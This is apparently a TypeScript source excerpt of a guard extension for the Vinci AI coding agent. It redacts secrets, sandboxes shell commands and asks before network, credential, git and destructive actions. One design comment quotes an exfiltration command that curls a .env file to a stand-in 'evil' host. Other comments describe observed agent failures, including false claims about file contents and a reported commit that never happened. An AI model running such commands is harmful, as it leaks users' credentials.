  const sandboxBackend = () => {
    if (process.env.VINCI_NO_SANDBOX === "1") return "developer bypass";
    if (process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec")) return "macOS sandbox";
    if (
      process.platform === "linux" &&
      ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"].some((path) => existsSync(path))
    ) {
      return "Bubblewrap";
    }
    return "unavailable — bash disabled";
  };

  pi.registerCommand("security", {
    description: "Show Vinci's active confidentiality and sandbox controls",
    handler: async (_args: string, ctx: ExtensionContext) => {
      ctx.ui.notify(
        [
          `Sandbox: ${sandboxBackend()}`,
          "Shell network: denied unless one exact command is approved",
          "Credential reads: denied unless one exact read is approved",
          "Provider/session secrets: redacted",
          "Images: user attachments are sent to Vinci Vision",
        ].join("\n"),
        process.env.VINCI_NO_SANDBOX === "1" ? "warning" : "info",
      );
    },
  });

  pi.on("session_start", (_event, ctx) => {
    buildNetworkApprovedForSession = false; // a new session re-asks before builds reach the internet
    const status = sandboxBackend();
    if (status === "developer bypass") {
      ctx.ui.notify("Security warning: VINCI_NO_SANDBOX=1 allows shell filesystem and network access.", "warning");
    } else if (status.startsWith("unavailable")) {
      ctx.ui.notify("Bash is disabled because Vinci could not find an enforceable OS sandbox.", "warning");
    }
  });

  // Sandbox follow-up: when a bash command fails with a write-permission error while the sandbox is on,
  // it most likely tried to write OUTSIDE the project and the OS sandbox blocked it. A raw "Operation
  // not permitted" is baffling — so append a plain-language note (the model sees it too, so it explains
  // rather than blindly retrying). Best-effort + advisory; only fires on an actual failure.
  pi.on("tool_result", async (event) => {
    if (event.toolName !== "bash" || !event.isError) return;
    if (process.env.VINCI_CODE !== "1" || process.env.VINCI_NO_SANDBOX === "1") return;
    const text = (event.content ?? [])
      .filter((c): c is { type: "text"; text: string } => c.type === "text")
      .map((c) => c.text)
      .join("\n");
    if (!/operation not permitted|permission denied|not permitted|read-only file system/i.test(text)) return;
    const note =
      "\n\n[Vinci safety note: this likely failed because the command tried to write OUTSIDE your " +
      "project folder — Vinci confines writes to your project so an automated command can't touch the " +
      "rest of your machine. If it should write inside the project, fix the path. If it genuinely needs " +
      "to write elsewhere and you trust it, tell the user they can re-run Vinci with the sandbox off " +
      "(set VINCI_NO_SANDBOX=1). Do NOT blindly retry the same command.]";
    return { content: [...event.content, { type: "text", text: note }], details: event.details, isError: event.isError };
  });

  // Persistence/model boundary: tool output is stored after this hook and later becomes provider
  // context. Redact here so neither the JSONL session nor a future compaction can recover the value.
  pi.on("tool_result", (event) => {
    const content = event.content.map((part) =>
      part.type === "text" ? { ...part, text: redactSecrets(part.text) } : part,
    );
    const details = redactSecretsDeep(event.details);
    return { content, details, isError: event.isError };
  });

  // Last-line defense for provider-specific payload shapes and extension-injected messages.
  pi.on("before_provider_request", (event) => redactSecretsDeep(event.payload));

  // The model reads a REDACTED view — redactSecretsDeep() above masks every secret to <vinci-secret>
  // before the request reaches it, so it literally cannot see real secret values. Without knowing that,
  // it treats the placeholder as ground truth and makes confident, FALSE claims about file contents
  // (breaker P1: it told the user a key was on disk as "<vinci-secret>" while the real key sat intact).
  // Tell the model its view is masked so it reports honestly instead of guessing.
  pi.on("before_agent_start", (event) => ({
    systemPrompt:
      `${event.systemPrompt}\n\n## You see a redacted view of secrets\n` +
      "Any API key, token, password, or .env value in a file you read, a tool result, or a diff is " +
      "automatically replaced with `<vinci-secret>` (or `<vinci-private-key>`) before it reaches you — a " +
      "safety measure so a real secret is never painted across the user's screen. The real values stay " +
      "intact in their files; you simply cannot see them. So: never tell the user that `<vinci-secret>` " +
      "(or any redaction placeholder) is the actual content of their file, and never say a secret is " +
      "“already scrubbed” or “just a placeholder” based on what you see. If asked what a " +
      "secret literally contains, or whether the real value is still there, say you can’t see it " +
      "because it’s redacted for their security — do not guess or assert the placeholder is the truth.\n\n" +
      "CRUCIAL — what you CAN do: the redaction hides secrets from YOUR VIEW only; it does NOT stop a " +
      "command you run from using the REAL values. A command you run (`npm run …`, a dev server, a build, " +
      "a test) loads the actual `.env` from the environment and authenticates for real — the sandbox " +
      "provides your project's `.env` to that process. You do NOT need to SEE a secret to USE it. So RUN " +
      "local `.env`-dependent commands yourself; never punt one to the user just because you \"can't see " +
      "the values\" — that's not a real blocker.\n\n" +
      "What you genuinely CAN'T do here — and what to do about it: this session runs sandboxed. A command " +
      "that reaches the INTERNET needs the user's one-tap approval (let it ask; that's fine). But some " +
      "things this session cannot complete at all — e.g. a command that needs interactive external login, " +
      "or a live hosted service you can't authenticate to headlessly. When a command GENUINELY can't " +
      "finish here (a real limitation, not just a masked value): do NOT retry it blindly, and do NOT edit " +
      "files to work around it. Say plainly what's blocked and why, give the user the EXACT single command " +
      "to run in their own terminal, and say what output to expect — then continue with everything else " +
      "you CAN do. One clean handoff of the irreducible step, not a struggle.",
  }));

  pi.on("tool_call", async (event, ctx) => {
    // --- Shell commands: block catastrophic, confirm dangerous. ---
    if (event.toolName === "bash") {
      const cmd = String((event.input as { command?: unknown }).command ?? "");
      if (!cmd.trim()) return undefined;

      // Never let a shell-writing workaround bypass structured file safety. This also prevents
      // documentation such as `echo '... prisma migrate reset ...' >> SETUP.md` from being mistaken
      // for an attempt to reset the database: the unsafe write mechanism is rejected first.
      if (isShellFileWrite(cmd)) {
        if (ctx.hasUI) ctx.ui.notify("Vinci tried to write a file through the shell — switching to the safer file editor.", "info");
        sendVinciControl(
          pi,
          "vinci-shell-write-block",
          "That shell command was blocked because it writes file content. Use write for a necessary project file or edit for a targeted project change, then re-read the file to verify it. For a one-off diagnostic, use an inline command or the repository's existing focused test instead of creating a scratch file inside or outside the project. Do not retry with echo, printf, tee, heredocs, sed -i, or perl -pi.",
        );
        return { block: true, reason: "Vinci blocked a shell-based file write; use the structured write or edit tool instead." };
      }

      const riskText = shellRiskText(cmd);
      const bundledClasses = detectBundledClasses(cmd);
      const hasMultipleGuardClasses = bundledClasses.size > 1;
      const confirmedClasses = new Set<GuardClass>();
      const securityScopes: string[] = [];

      if (isSensitiveShellRead(cmd)) {
        if (!ctx.hasUI)
          return blockHeadless(
            "read a file that may contain credentials",
            "If the actual values aren't essential, inspect .env.example, schemas, or code references instead.",
          );
        const ok = await confirmSafely(
          ctx,
          "Vinci — expose credentials to this session?",
          `This command may print credentials into Vinci's model context:\n\n  ${cmd}\n\nRun this exact command once? Detected values will be redacted.`,
        );
        if (!ok) return { block: true, reason: "Blocked — the user declined the shell credential read. Do not retry it or read the file another way; use .env.example or code references, or ask them." };
        securityScopes.push("read");
      }

      // A `bash deploy.sh` / `npm run deploy` hides its network use inside a file, so scan the referenced
      // script/target too — otherwise the deploy silently loses the internet mid-run and dies at the first
      // API/auth call (observed live: gcloud EPERM on oauth2.googleapis.com from inside deploy.sh). The
      // scan is a DETECTION-ONLY heuristic (hardened: regular-files-only, symlink/dev rejected, capped);
      // it decides whether to ASK, never to grant.
      //
      // No silent auto-grant for cloud commands. Two adversarial reviews showed a shell command can't be
      // classified as "safe to network" — a cloud CLI can be pointed at an attacker endpoint
      // (`aws --endpoint-url …`), an argv[0] can be an impostor (`./gcloud`), and command substitution
      // (`gcloud $(curl @.env evil)`) runs arbitrary commands under the grant. The one-command prompt is
      // the boundary the shell can't launder around, so EVERY network command takes it. The real fix over
      // the old silent EPERM: a wrapped deploy is now detected and ASKS once instead of dying.
      const scannedScript = readOpaqueExecTargets(cmd, ctx.cwd);
      const netText = scannedScript ? `${cmd}\n${scannedScript}` : cmd;
      const netRiskText = shellRiskText(netText);
      const priorityDanger = DANGEROUS.find(([pattern]) => pattern.test(netRiskText));
      const priorityDatabase = DATABASE.find(([pattern]) => pattern.test(netRiskText));
      const readOnlyLocalNpx = /\bnpx\s+prisma\s+migrate\s+status\b/i.test(netRiskText);
      if (!readOnlyLocalNpx && (isShellNetworkCommand(netText) || isCloudDeployCommand(netText))) {
        // Keep destructive/database intent ahead of the network prompt. If accepted, the command still
        // needs a separate one-command network grant before it can run.
        if (priorityDanger) {
          if (!ctx.hasUI) return blockHeadless(priorityDanger[1]);
          if (!(await confirmRisky(ctx, "Vinci — confirm a risky command", `This looks destructive (${priorityDanger[1]}):\n\n  ${cmd}\n\nRun it?`, cmd))) {
            ctx.ui.notify("Command blocked.", "info");
            return { block: true, reason: "Blocked — the user declined the risky command. Do not retry it or achieve the same effect another way; do what they asked differently, or ask them." };
          }
          confirmedClasses.add("dangerous");
        } else if (priorityDatabase) {
          if (!ctx.hasUI) return blockHeadless(priorityDatabase[1]);
          if (!(await confirmRisky(ctx, "Vinci — confirm a database change", `Vinci wants to ${priorityDatabase[1]}:\n\n  ${cmd}\n\nGo ahead?`, cmd))) {
            ctx.ui.notify("Held off — good call.", "info");
            return { block: true, reason: `Blocked — the user declined to ${priorityDatabase[1]}. Don't run this; do what they asked another way, or ask them.` };
          }
          confirmedClasses.add("database");
        }
        // A network action bundled with local mutations makes the approval ambiguous: declining
        // "git commit && git push" to stop the push also silently cancels the commit — observed
        // live, with the model then reporting a commit that never happened. Approval and denial
        // must each mean exactly one thing, so the local work and the network action have to be
        // separate invocations. (Judged on the DIRECT command — a script file is one segment.)
        const segments = shellSegments(cmd);
        const bundledMutations = segments.filter(
          (segment) => !isShellNetworkCommand(segment) && planCommandMutates(segment),
        );
        const mutationsHaveOwnGuard = bundledMutations.every(
          (segment) => classifySegmentClasses(segment).length > 0,
        );
        if (
          segments.length > 1 &&
          bundledMutations.length > 0 &&
          (!hasMultipleGuardClasses || !mutationsHaveOwnGuard)
        ) {
          sendVinciControl(
            pi,
            "vinci-network-bundle-block",
            `This command bundles local changes (${bundledMutations.join(" · ")}) with a network action in one invocation, so approving or declining it is ambiguous. Run the local changes as their own command first, verify they landed, then request the network action separately.`,
          );
          return {
            block: true,
            reason:
              "Blocked — run local changes and network actions as separate commands so an approval applies to exactly one thing.",
          };
        }
        if (!ctx.hasUI) {
          // This check runs BEFORE the CONSEQUENTIAL loop, so network-shaped consequential commands
          // (git push, gh, npm publish, deploys via curl) would otherwise block here with no gate and
          // spiral into a generic BLOCKED — reuse the tailored OUTWARD/SYSTEM wording when one matches.
          const netWhy =
            OUTWARD.find(([re]) => re.test(netRiskText))?.[1] ??
            SYSTEM.find(([re]) => re.test(netRiskText))?.[1] ??
            "run a command that needs the internet";
          return blockHeadless(netWhy);
        }
        const outward = OUTWARD.find(([pattern]) => pattern.test(netRiskText));
        const effect = outward ? `\n\nEffect: this would ${outward[1]}.` : "";
        // Ordinary build tooling (npm/pip/pod/gradle…) asks ONCE per session, then normal dev work runs
        // without a prompt per command — otherwise installing dependencies is unusable. Raw network
        // tools and cloud CLIs still take the per-command gate below.
        if (isDevToolchainOnlyNetwork(netText) && !hasMultipleGuardClasses) {
          if (!buildNetworkApprovedForSession) {
            const okBuild = await confirmSafely(
              ctx,
              "Vinci — let builds reach the internet?",
              `Installing packages and scaffolding a project needs the internet:\n\n  ${cmd}\n\nAllow build tools (npm, pip, gradle…) to reach the internet for the rest of this session? Anything else that goes online will still ask each time.`,
            );
            if (!okBuild)
              return {
                block: true,
                reason:
                  "Blocked — the user declined internet access for BUILD TOOLS. Don't retry this install or fetch these packages another way. This deny is SCOPED to build-tool downloads only: other network actions the user asks for (e.g. `git push`) are NOT blocked — attempt them normally and each will prompt for its own approval. Work with what's already installed locally, or ask the user.",
              };
            buildNetworkApprovedForSession = true;
          }
          securityScopes.push("network");
        } else {
          const ok = await confirmSafely(
            ctx,
            "Vinci — allow this network command once?",
            `This command can connect to an external service or transfer data:\n\n  ${cmd}${effect}\n\nAllow this exact invocation once?`,
          );
          if (!ok) return { block: true, reason: "Blocked — the user declined THIS network command. Don't retry it or run an equivalent that goes online. This applies to this one command only — a different network action the user asks for (e.g. `git push`) is NOT blocked; attempt it and it will prompt for approval. Do what they asked locally, or ask them." };
          securityScopes.push("network");
        }
        if (outward) confirmedClasses.add("outward");
      }
      if (securityScopes.length > 0) {
        (event.input as { command: string }).command = signSecurityCommand(cmd, ctx.cwd, securityScopes);
      }

      // Broad staging can silently absorb unrelated work from another session. Never do it: exact
      // paths keep the checkpoint reviewable even when the user explicitly asked for a commit.
      if (isBroadGitStage(riskText)) {
        if (ctx.hasUI) ctx.ui.notify("Vinci kept unrelated changes out of the checkpoint.", "info");
        sendVinciControl(
          pi,
          "vinci-broad-git-block",
          "Broad git staging was blocked. Inspect git status, then stage only the exact files changed for the current task. Never use git add ., git add -A, git add --all, git add *, or git commit -a.",
        );
        return { block: true, reason: "Vinci blocked broad git staging. Stage only explicit files from the current task." };
      }

      if (isGitStageOrCommit(riskText) && !gitCheckpointApproved) {
        if (!ctx.hasUI) return blockHeadless("save a git checkpoint (stage or commit changes)");
        const ok = await confirmSafely(
          ctx,
          "Vinci — save a git checkpoint?",
          `You didn't ask Vinci to stage or commit changes in this request:\n\n  ${cmd}\n\nCreate a git checkpoint now?`,
        );
        if (!ok) {
          sendVinciControl(
            pi,
            "vinci-unrequested-git-block",
            "The user did not authorize a git checkpoint. Leave the working tree and index alone, report the changed files, and do not retry git add or git commit.",
          );
          return { block: true, reason: "Blocked — the user did not ask Vinci to stage or commit changes." };
        }
        gitCheckpointApproved = true;
      }

      // Catastrophic: fixed patterns + a recursive-force rm aimed at / or home. Only inspect rm's
      // parsed operands so a home path used by an earlier cd does not create a false positive.
      const cata = CATASTROPHIC.find(([re]) => re.test(riskText));
      const rmRoot = recursiveForceRmTargets(riskText).some((targets) => targets.some((target) => ROOT_TARGET.test(target)));
      if (cata || rmRoot) {
        const why = cata ? cata[1] : "rm -rf on / or your home directory";
        if (ctx.hasUI) ctx.ui.notify(`Vinci blocked a catastrophic command: ${why}.`, "error");
        return { block: true, reason: `Vinci refuses to run this — ${why}. It is never safe. If you truly mean it, run it yourself outside Vinci.` };
      }

      // Dangerous: a recursive-force rm (non-root) or a listed pattern → confirm.
      const danger = confirmedClasses.has("dangerous") ? undefined : DANGEROUS.find(([re]) => re.test(riskText));
      const why = danger ? danger[1] : isRecursiveForceRm(riskText) ? "recursive force delete (rm -rf)" : null;
      if (why) {
        if (!ctx.hasUI) return blockHeadless(why);
        if (!(await confirmRisky(ctx, "Vinci — confirm a risky command", `This looks destructive (${why}):\n\n  ${cmd}\n\nRun it?`, cmd))) {
          ctx.ui.notify("Command blocked.", "info");
          return { block: true, reason: "Blocked — the user declined the risky command. Do not retry it or achieve the same effect another way; do what they asked differently, or ask them." };
        }
        confirmedClasses.add("dangerous");
        if (!hasMultipleGuardClasses) return undefined;
      }

      // Consequential — reaches the real world / changes your whole computer. Confirm with tailored wording.
      for (const g of CONSEQUENTIAL) {
        const guardClass: GuardClass = g.list === DATABASE ? "database" : g.list === OUTWARD ? "outward" : "system";
        if (confirmedClasses.has(guardClass)) continue;
        if (g.list === OUTWARD && securityScopes.includes("network")) continue;
        const hit = g.list.find(([re]) => re.test(riskText));
        if (!hit || g.skip?.(riskText, hit[1])) continue;
        if (!ctx.hasUI) return blockHeadless(hit[1]);
        if (!(await confirmRisky(ctx, g.title, `Vinci wants to ${hit[1]}:\n\n  ${cmd}\n\nGo ahead?`, cmd))) {
          ctx.ui.notify("Held off — good call.", "info");
          return { block: true, reason: `Blocked — the user declined to ${hit[1]}. Don't run this; do what they asked another way, or ask them.` };
        }
        confirmedClasses.add(guardClass);
        if (!hasMultipleGuardClasses) return undefined;
      }

      // Committing secret files → leaks them once pushed. Two ways in: the command NAMES a secret file,
      // or a BROAD add/commit would sweep an un-gitignored one the user never mentioned.
      const named = isCommitSecrets(riskText);
      const swept = !named && isBroadGitStage(riskText) ? secretsAboutToBeStaged(ctx.cwd) : [];
      if (named || swept.length) {
        if (!ctx.hasUI)
          return blockHeadless(
            "commit secret files to git",
            `If they shouldn't be in git, add ${swept.length ? swept.join(", ") : "them"} to .gitignore and commit the rest.`,
          );
        const which = swept.length ? `\n\nThis would sweep in: ${swept.join(", ")}` : "";
        const ok = await confirmSafely(
          ctx,
          "Vinci — put secrets into git?",
          `This would add secret files to git, which leaks them once the repo is pushed:\n\n  ${cmd}${which}\n\nAre you sure?`,
        );
        if (!ok) {
          ctx.ui.notify("Kept your secrets out of git.", "info");
          return { block: true, reason: `Blocked — the user declined to commit secret files (leak risk).${swept.length ? ` Add ${swept.join(", ")} to .gitignore first.` : " Add them to .gitignore instead."}` };
        }
        return undefined;
      }
      return undefined;
    }

    if (event.toolName === "read") {
      const input = event.input as { path?: unknown; file_path?: unknown; filePath?: unknown };
      const path = String(input.path ?? input.file_path ?? input.filePath ?? "");
      if (!path || !isSensitiveReadPath(path)) return undefined;
      if (!ctx.hasUI)
        return blockHeadless(
          `read ${path}, which may contain credentials`,
          "If the actual values aren't essential, inspect .env.example, schemas, or code references instead.",
        );
      const ok = await confirmSafely(
        ctx,
        "Vinci — read a secrets file?",
        `${path} may contain live credentials. Vinci can usually inspect the template or code references instead.\n\nRead it anyway?`,
      );
      if (!ok) {
        sendVinciControl(
          pi,
          "vinci-sensitive-read-block",
          "Do not read the secrets file again. Inspect .env.example, schemas, or code references instead, and ask only if the real values are genuinely required.",
        );
        return { block: true, reason: `Blocked — the user declined to expose credentials from ${path}.` };
      }
      return undefined;
    }

    // --- Protected paths: confirm before write/edit clobbers a sensitive file OR touches a file
    //     OUTSIDE the project folder. (Reads outside are fine — useful for cross-project reference —
    //     but silently CHANGING files anywhere on the machine should be a deliberate choice.) ---
    if (event.toolName === "write" || event.toolName === "edit") {
      const input = event.input as {
        path?: unknown;
        file_path?: unknown;
        filePath?: unknown;
        content?: unknown;
        oldText?: unknown;
        newText?: unknown;
        edits?: Array<{ oldText?: unknown; newText?: unknown }>;
      };
      const path = String(input.path ?? input.file_path ?? input.filePath ?? "");
      if (!path.trim()) return undefined;

      const proposedContent = [input.content, input.newText, ...(input.edits ?? []).map((edit) => edit.newText)]
        .filter((value): value is string => typeof value === "string")
        .join("\n");

      // Secret masking replaces sensitive-looking strings with placeholders in everything the model
      // sees, but the file on disk keeps the raw bytes. An edit whose oldText carries a placeholder
      // can never match the real file (and "re-read and copy it exactly" re-reads masked content —
      // a guaranteed dead end), and proposed content carrying a placeholder would overwrite a real
      // value on disk with the literal placeholder text. Fail both fast, with guidance that can work.
      const oldTexts = [input.oldText, ...(input.edits ?? []).map((edit) => edit.oldText)].filter(
        (value): value is string => typeof value === "string",
      );
      if (event.toolName === "edit" && oldTexts.some((text) => MASK_PLACEHOLDER.test(text))) {
        sendVinciControl(
          pi,
          "vinci-masked-edit-block",
          "Your oldText contains a masking placeholder (<vinci-secret>), so it can never match the real file, and re-reading returns the same placeholder. Do not attempt to reveal, reconstruct, or otherwise obtain the raw value. In ONE step now, do exactly one of: (a) make the edit anchored only on nearby lines that contain no placeholder, or (b) stop and ask the user to make this one change themselves. Do not keep exploring workarounds.",
        );
        return {
          block: true,
          reason: `Blocked — the edit's oldText contains Vinci's secret-masking placeholder, which never matches the real content of ${path}. Do not try to reveal or reconstruct the raw value — anchor only on nearby placeholder-free lines, or ask the user to make the change, in one step without further workarounds.`,
        };
      }
      if (MASK_PLACEHOLDER.test(proposedContent)) {
        sendVinciControl(
          pi,
          "vinci-masked-write-block",
          "The content you proposed contains a masking placeholder (<vinci-secret>). Writing it would replace a real value on disk with the literal placeholder and destroy it. Do not attempt to reveal, reconstruct, or otherwise obtain the raw value, and do not rewrite the whole file — the masked region would be lost. Instead, make a targeted edit anchored only on nearby placeholder-free lines, or ask the user to update that value. Do not keep exploring workarounds.",
        );
        return {
          block: true,
          reason: `Blocked — the proposed content for ${path} contains Vinci's secret-masking placeholder; writing it would destroy the real value it stands for. Do not rewrite the whole file or try to reveal, reconstruct, or otherwise obtain the value — use a targeted edit on placeholder-free lines, or ask the user.`,
        };
      }

      if (isFalseGreenTestChange(path, proposedContent)) {
        if (ctx.hasUI) ctx.ui.notify("Vinci blocked a test that always passes without testing anything.", "warning");
        sendVinciControl(
          pi,
          "vinci-false-green-block",
          "A placeholder/no-op test command was blocked. Do not make CI green with echo, true, exit 0, skipped tests, or continue-on-error. Add a real narrow test, or leave the test step out and report honestly that automated tests are not configured.",
        );
        return { block: true, reason: "Vinci blocked a false-green test command that performs no real verification." };
      }

      const abs = resolve(ctx.cwd, path);

      // Wholesale overwrite: replacing an existing, non-trivial file with far LESS content is likely a
      // data-loss accident (a whole file → a stub). `write` replaces the file entirely; `edit` is
      // targeted, so we only check `write`. Creating a new file (stat throws) is always fine.
      if (event.toolName === "write") {
        let existingSize: number | null = null;
        try {
          const st = statSync(abs);
          if (st.isFile()) existingSize = st.size;
        } catch {
          /* file doesn't exist → creating it, no loss */
        }
        const newLen = Buffer.byteLength(String(input.content ?? ""), "utf8");
        if (existingSize !== null && existingSize > 200 && newLen < existingSize * 0.4) {
          if (!ctx.hasUI)
            return {
              block: true,
              reason:
                `Blocked — overwriting ${path} would lose most of its content and there's no UI to confirm. ` +
                "If you only meant to change part of it, use the edit tool instead of rewriting the whole file.",
            };
          let ok = false;
          try {
            ok = await confirmSafely(
              ctx,
              "Vinci — overwrite and lose content?",
              `${path} already has ${existingSize} bytes and Vinci wants to replace the whole file with much less (${newLen} bytes) — you'd lose most of what's there.\n\nOverwrite it?`,
            );
          } catch {
            ok = false;
          }
          if (!ok) {
            ctx.ui.notify("Kept the file as it was.", "info");
            return { block: true, reason: `Blocked — the user declined to overwrite ${path} (it would lose content). If you only meant to change part of it, use the edit tool instead of rewriting the whole file.` };
          }
        }
      }

      if (!outsideWritesAllowed && abs !== ctx.cwd && !abs.startsWith(ctx.cwd + sep)) {
        // A from-scratch build often makes the model invent a generic placeholder path
        // (/home/user/project/index.html) instead of the grounded cwd (observed live 2026-07-15,
        // reproducibly, on empty-project web builds). That is a hallucinated path, not a deliberate
        // out-of-project write — steer the model to a project-relative path rather than asking a
        // non-programmer to approve an "outside project" write they never intended.
        if (PLACEHOLDER_WRITE_PATH.test(abs)) {
          const rel = basename(path) || "index.html";
          sendVinciControl(
            pi,
            "vinci-placeholder-path-block",
            `"${abs}" is a generic placeholder path, not this project. Create the file with a path relative to the current project — e.g. "${rel}" — which resolves under ${ctx.cwd}. Do not use absolute placeholder paths like /home/user/project.`,
          );
          return {
            block: true,
            reason: `Blocked — "${abs}" is a placeholder path, not this project. Use a project-relative path such as "${rel}".`,
          };
        }
        const vinciHome = resolve(getVinciHome());
        const storeRoot = existsSync(vinciHome) ? realpathSync(vinciHome) : vinciHome;
        const resolvedAbs = existsSync(abs) ? realpathSync(abs) : abs;
        const resolvedCwd = existsSync(ctx.cwd) ? realpathSync(ctx.cwd) : resolve(ctx.cwd);
        const cwdIsUnderStore = resolvedCwd === storeRoot || resolvedCwd.startsWith(storeRoot + sep);
        if (
          !cwdIsUnderStore &&
          (resolvedAbs === storeRoot || resolvedAbs.startsWith(storeRoot + sep))
        ) {
          const rel = basename(path) || "index.html";
          sendVinciControl(
            pi,
            "vinci-store-path-block",
            `"${abs}" points into Vinci's internal bookkeeping mirror, not the project. Create the file with a project-relative path — e.g. "${rel}" — which resolves under ${ctx.cwd}. Do not write project files into Vinci's internal store.`,
          );
          return {
            block: true,
            reason: `Blocked — "${abs}" is in Vinci's internal bookkeeping mirror, not the project. Use a project-relative path such as "${rel}".`,
          };
        }
        if (!ctx.hasUI) return blockHeadless(`change a file outside the project folder (${abs})`);
        // Confirm ONCE per session (not per edit) — a deliberate opt-in to work outside the project,
        // without nagging on every change.
        const ok = await confirmSafely(
          ctx,
          "Vinci — work outside this project?",
          `Vinci wants to change a file OUTSIDE this project folder:\n\n  ${abs}\n\nIt's working in ${ctx.cwd}. Allow Vinci to make changes outside this project for the rest of this session?`,
        );
        if (!ok) {
          ctx.ui.notify("Change blocked.", "info");
          return { block: true, reason: "Blocked — you declined changes outside the project folder." };
        }
        outsideWritesAllowed = true;
      }

      const hit = SENSITIVE_PATHS.find(([re]) => re.test(path));
      if (hit) {
        if (!ctx.hasUI) return blockHeadless(`change ${hit[1]}`);
        const ok = await confirmSafely(
          ctx,
          "Vinci — confirm a sensitive change",
          `Vinci wants to change ${hit[1]}:\n\n  ${path}\n\nThat's usually not something to edit by hand. Let it?`,
        );
        if (!ok) {
          ctx.ui.notify("Change blocked.", "info");
          return { block: true, reason: "Blocked — you declined the sensitive change." };
        }
      }
      return undefined;
    }

    return undefined;
  });
}
